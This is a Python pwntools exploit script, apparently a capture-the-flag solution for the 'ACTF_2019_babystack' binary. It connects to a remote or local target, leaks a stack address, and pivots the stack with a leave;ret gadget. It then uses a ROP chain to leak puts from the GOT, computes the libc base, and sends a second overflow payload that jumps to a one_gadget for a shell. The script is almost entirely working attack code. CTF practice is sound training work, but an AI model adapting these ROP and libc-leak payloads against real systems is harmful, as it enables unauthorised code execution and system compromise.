#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./ACTF_2019_babystack"                                   # 本地ELF
    pro_libc = "/lib/x86_64-linux-gnu/libc.so.6"       # Libc文件
    rem_libc = "../../libc-2.27_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)


def exp():
    leave_ret=0x0000000000400a18
    pop_rdi=0x0000000000400ad3
    main_addr=0x4008f6
    puts_got=elf.got['puts']
    puts_plt=elf.plt['puts']
    ru(">")
    sl(str(0xe0))
    ru("at ")
    stack_addr=int(rv(14),16)
    info("stack_addr: "+hex(stack_addr))
    info("leave_ret: "+hex(leave_ret))
    payload=p64(stack_addr)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    payload=payload.ljust(0xd0)+p64(stack_addr)+p64(leave_ret)
    ru(">")
    sd(payload)
    
    ru("~\n")
    puts_got=u64(rv(6).ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x4f2c5
    info("ogg: "+hex(ogg))
    system_addr=libc_base+libc.sym['system']
    binsh=libc_base+libc.search('/bin/sh').next()

    ru(">")
    sl(str(0xe0))
    ru(">")
    payload2='\x00'*0xd8+p64(ogg)
    sl(payload2)


if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

